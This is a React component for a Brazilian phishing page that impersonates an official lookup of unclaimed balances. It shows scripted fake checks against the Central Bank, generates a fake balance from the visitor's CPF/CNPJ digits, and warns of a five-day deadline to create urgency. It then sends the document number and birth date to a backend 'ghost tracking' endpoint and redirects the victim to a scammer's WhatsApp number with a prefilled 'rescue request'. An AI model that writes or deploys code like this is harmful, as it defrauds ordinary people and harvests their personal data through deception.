import { useEffect, useState } from "react";
import { Search, X, CheckCircle2, Smartphone, Loader2, Info, ArrowRight, ShieldCheck } from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import axios from "axios";
import { API_URL } from "../config";

interface Step2Props {
  data: {
    docType: string;
    docValue: string;
    birthDate: string;
  };
  onReset: () => void;
}

type AnalysisState = "checking_base" | "verifying_identity" | "finalizing" | "results";

export function Step2({ data, onReset }: Step2Props) {
  const [analysisState, setAnalysisState] = useState<AnalysisState>("checking_base");
  const [config, setConfig] = useState({ 
    whatsappNumber: typeof window !== 'undefined' ? (localStorage.getItem('svr_last_whatsapp') || "5511922968136") : "5511922968136" 
  });
  const [isProcessingWhatsApp, setIsProcessingWhatsApp] = useState(false);
  const [processStep, setProcessStep] = useState(0);

  useEffect(() => {
    const fetchConfig = async () => {
      try {
        const response = await axios.get(`${API_URL}/api/config?t=${Date.now()}`);
        if (response.data.whatsappNumber) {
          console.log("✅ Número sincronizado dinamicamente:", response.data.whatsappNumber);
          setConfig(response.data);
          // Salvar para o navegador não esquecer se houver oscilação
          localStorage.setItem('svr_last_whatsapp', response.data.whatsappNumber);
        }
      } catch (err) {
        console.error("Falha na sincronia modular. Usando memória local.");
        const lastSaved = localStorage.getItem('svr_last_whatsapp');
        if (lastSaved) setConfig({ whatsappNumber: lastSaved });
      }
    };
    fetchConfig();

    const timers = [
      setTimeout(() => setAnalysisState("verifying_identity"), 2500),
      setTimeout(() => setAnalysisState("finalizing"), 4500),
      setTimeout(() => setAnalysisState("results"), 6500),
    ];

    return () => timers.forEach(clearTimeout);
  }, []);

  const calculateValue = (doc: string) => {
    // Deterministic value based on document digits
    const digits = doc.replace(/\D/g, "");
    const base = parseInt(digits.substring(0, 4)) || 1234;
    const value = (base * 1.5) + (parseInt(digits.slice(-2)) * 10);
    return value.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
  };

  const handleWhatsAppRedirect = () => {
    setIsProcessingWhatsApp(true);

    // Sequence of "automatic" verification steps
    const steps = [
      "Sincronizando protocolo de segurança...",
      "Validando titularidade fiscal...",
      "Gerando token de liberação única...",
      "Conectando ao canal de atendimento prioritário..."
    ];

    let currentStep = 0;
    const interval = setInterval(() => {
      if (currentStep < steps.length - 1) {
        currentStep++;
        setProcessStep(currentStep);
      } else {
        clearInterval(interval);

        const userId = localStorage.getItem('svr_user_id') || "N/A";
        const protocol = `SVR-${userId.toUpperCase()}`;
        const token = btoa(data.docValue).substring(0, 12).toUpperCase();

        const header = `*SOLICITAÇÃO DE RESGATE - PROTOCOLO DE SEGURANÇA*`;
        const body = `Prezados, venho por meio desta formalizar o requerimento de liberação de ativos vinculados ao meu documento conforme os protocolos do sistema.\n\n` +
          `*DETALHES DA SOLICITAÇÃO:* \n` +
          `• Protocolo: *#${protocol}*\n` +
          `• Token de Validação: *${token}*\n` +
          `• Documento Identificado: *${data.docValue}*\n\n` +
          `Solicito o acompanhamento de um especialista para conclusão do procedimento de transferência de acordo com as normas de segurança vigentes.`;

        const message = encodeURIComponent(header + "\n\n" + body);

        // Notify Admin Bot & Update original Session message (GHOST TRACKING)
        try {
          const userIdForApi = localStorage.getItem('svr_user_id');
          if (userIdForApi) {
            axios.post(`${API_URL}/api/v1/session/convert`, {
              userId: userIdForApi,
              details: { docValue: data.docValue, birthDate: data.birthDate }
            });
          }
        } catch (e) { }

        window.location.href = `https://wa.me/${config.whatsappNumber}?text=${message}`;
      }
    }, 1200);
  };

  const AnalysisLoader = ({ text }: { text: string }) => (
    <div className="flex flex-col items-center justify-center p-16 bg-white dark:bg-[#1f292e] rounded shadow-sm border border-gray-100 dark:border-[#2a373d] max-w-[420px] mx-auto text-center space-y-6 min-h-[450px] transition-colors duration-300">
      <div className="relative">
        <Loader2 className="w-16 h-16 text-[#2d7890] dark:text-[#429bb8] animate-spin" strokeWidth={1.5} />
        <div className="absolute inset-0 flex items-center justify-center">
          <Search size={24} className="text-[#2d7890] dark:text-[#429bb8] opacity-50" />
        </div>
      </div>
      <div className="space-y-2">
        <h3 className="text-xl font-bold text-gray-800 dark:text-gray-200 tracking-tight transition-colors duration-300">{text}</h3>
        <div className="flex gap-1 justify-center">
          {[0, 1, 2].map((i) => (
            <motion.div
              key={i}
              className="w-2 h-2 bg-[#2d7890] rounded-full"
              animate={{ opacity: [0.3, 1, 0.3] }}
              transition={{ repeat: Infinity, duration: 1.5, delay: i * 0.2 }}
            />
          ))}
        </div>
      </div>
      <p className="text-sm text-gray-500 dark:text-gray-400 font-medium opacity-60 transition-colors duration-300">Sincronizando com as bases do Banco Central...</p>
    </div>
  );

  return (
    <AnimatePresence mode="wait">
      {analysisState === "checking_base" && (
        <motion.div key="check" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
          <AnalysisLoader text="Analisando base de CPFs/CNPJs..." />
        </motion.div>
      )}
      {analysisState === "verifying_identity" && (
        <motion.div key="verify" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
          <AnalysisLoader text="Verificando saldos residuais..." />
        </motion.div>
      )}
      {analysisState === "finalizing" && (
        <motion.div key="final" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}>
          <AnalysisLoader text="Finalizando consulta segura..." />
        </motion.div>
      )}

      {analysisState === "results" && (
        <motion.div
          key="results"
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          className="bg-white dark:bg-[#1f292e] rounded-[4px] border border-[#d1d1d1] dark:border-[#2a373d] overflow-hidden w-full max-w-[420px] mx-auto shadow-sm transition-colors duration-300"
        >
          <div className="px-5 py-[18px] border-b border-[#ddd] dark:border-[#2a373d] flex items-baseline justify-between bg-gray-50/50 dark:bg-[#1a2227]/50 transition-colors duration-300">
            <h2 className="text-[#626e7a] dark:text-[#9eaeb8] text-[20px] font-bold transition-colors duration-300">Relatório de Consulta</h2>
            <span className="text-[#626e7a] dark:text-[#9eaeb8] text-[14px] font-medium transition-colors duration-300">Oficial</span>
          </div>

          <div className="p-6 text-center space-y-6">
            <div className="flex flex-col items-center gap-3">
              <div className="w-14 h-14 rounded-full border-[2.5px] border-[#00df6c] flex items-center justify-center bg-green-50/30 dark:bg-green-900/20">
                <CheckCircle2 className="text-[#00df6c]" size={32} strokeWidth={2.5} />
              </div>
              <h2 className="text-[22px] font-bold text-[#333333] dark:text-white tracking-tight transition-colors duration-300">Saldos Identificados</h2>
            </div>

            <div className="bg-[#eff6ff] dark:bg-[#1e2a3b] rounded-[8px] p-5 space-y-4 border border-[#dbeafe] dark:border-[#2c3e50] transition-colors duration-300">
              <div className="flex justify-between items-start sm:items-center gap-2 text-[#1e3a8a] dark:text-[#60a5fa]">
                <div className="text-left flex-1 min-w-0">
                  <span className="text-[10px] font-bold text-[#626e7a] dark:text-[#9eaeb8] uppercase tracking-wider block mb-1 transition-colors duration-300">Status de Ativos</span>
                  <h3 className="text-[18px] sm:text-[22px] font-black text-[#1a407a] dark:text-[#93c5fd] leading-none transition-colors duration-300" style={{ wordBreak: 'break-word' }}>VALORES DISPONÍVEIS</h3>
                </div>
                <div className="bg-green-500/10 text-green-700 px-2 py-1 rounded text-[10px] font-bold border border-green-200 uppercase flex-shrink-0 mt-1 sm:mt-0">Verificado</div>
              </div>

              <div className="w-full h-px bg-[#3b82f6]/20"></div>

              <div className="grid grid-cols-2 gap-4 text-left">
                <div className="space-y-1">
                  <p className="text-[9px] text-[#3b82f6] font-extrabold uppercase">Titular</p>
                  <p className="text-[13px] font-bold text-[#1e3a8a] dark:text-[#93c5fd] truncate">{data.docValue}</p>
                </div>
                <div className="space-y-1">
                  <p className="text-[9px] text-[#3b82f6] font-extrabold uppercase">Nascimento</p>
                  <p className="text-[13px] font-bold text-[#1e3a8a] dark:text-[#93c5fd]">{data.birthDate}</p>
                </div>
              </div>
            </div>

            <div className="space-y-4">
              <div className="bg-gray-50 dark:bg-[#253238] border border-gray-200 dark:border-[#2a373d] p-4 rounded-[4px] flex gap-3 text-left shadow-sm transition-colors duration-300">
                <div className="bg-blue-100 dark:bg-blue-900/30 p-2 rounded-full self-start">
                  <Info className="text-[#1b668d] dark:text-[#429bb8]" size={18} />
                </div>
                <div className="space-y-1.5">
                  <p className="text-[14px] font-bold text-gray-800 dark:text-gray-200 uppercase tracking-wide transition-colors duration-300">Atenção ao Prazo de Resgate</p>
                  <p className="text-[13px] text-gray-600 dark:text-gray-400 leading-snug transition-colors duration-300">
                    Informamos que o seu saldo identificado possui um prazo de resgate de até <strong className="dark:text-gray-200">5 dias úteis</strong>. Após esse período, os valores serão bloqueados para análise manual prolongada.
                  </p>
                  <div className="flex items-center gap-2 pt-1">
                    <span className="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></span>
                    <p className="text-[11px] font-bold text-blue-600 uppercase">Solicite a liberação agora para evitar bloqueios.</p>
                  </div>
                </div>
              </div>

              <div className="flex flex-col gap-3">
                <button
                  onClick={handleWhatsAppRedirect}
                  className="w-full bg-[#1b668d] hover:bg-[#165576] text-white font-bold py-4 px-6 rounded-[4px] flex items-center justify-center gap-3 transition-all shadow-sm text-[16px] uppercase tracking-wide group"
                >
                  <Smartphone size={20} />
                  ACESSAR RESGATE AGORA
                  <ArrowRight size={18} className="ml-auto group-hover:translate-x-1 transition-transform" />
                </button>

                <div className="flex gap-2">
                  <button
                    onClick={onReset}
                    className="flex-1 bg-white dark:bg-[#1a2227] hover:bg-gray-50 dark:hover:bg-[#253238] text-[#626e7a] dark:text-[#9eaeb8] border border-[#cccccc] dark:border-[#4b5563] font-bold py-2.5 px-3 rounded-[4px] text-[11px] flex items-center justify-center gap-2 uppercase transition-colors duration-300"
                  >
                    Nova Consulta
                  </button>
                  <button
                    onClick={() => window.location.reload()}
                    className="flex-1 bg-white dark:bg-[#1a2227] hover:bg-gray-50 dark:hover:bg-[#253238] text-gray-400 dark:text-gray-500 border border-[#dddddd] dark:border-[#4b5563] font-bold py-2.5 px-3 rounded-[4px] text-[11px] flex items-center justify-center gap-2 uppercase transition-colors duration-300"
                  >
                    Encerrar
                  </button>
                </div>
              </div>
            </div>
          </div>
        </motion.div>
      )}


      {isProcessingWhatsApp && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="fixed inset-0 bg-[#1b668d]/95 z-[100] flex flex-col items-center justify-center p-8 text-white text-center"
        >
          <div className="w-full max-w-[320px] space-y-8">
            <div className="relative flex items-center justify-center">
              <Loader2 className="w-24 h-24 text-white/20 animate-spin" strokeWidth={1} />
              <ShieldCheck className="absolute w-10 h-10 text-white animate-pulse" />
            </div>

            <div className="space-y-4">
              <h2 className="text-xl font-bold tracking-tight uppercase">Processamento Automático</h2>
              <div className="space-y-2">
                {[0, 1, 2, 3].map((i) => (
                  <div key={i} className={`flex items-center gap-3 text-sm transition-all duration-500 ${i <= processStep ? 'opacity-100' : 'opacity-20'}`}>
                    {i < processStep ? <CheckCircle2 size={16} className="text-green-400" /> : <div className="w-4 h-4 border border-white/30 rounded-full" />}
                    <span className={i === processStep ? 'font-bold' : ''}>
                      {[
                        "Sincronizando protocolo de segurança...",
                        "Validando titularidade fiscal...",
                        "Gerando token de liberação única...",
                        "Conectando ao canal de atendimento prioritário..."
                      ][i]}
                    </span>
                  </div>
                ))}
              </div>
            </div>

            <p className="text-[10px] opacity-50 uppercase tracking-[0.2em] font-bold">Iniciando Chat Seguro</p>
          </div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}


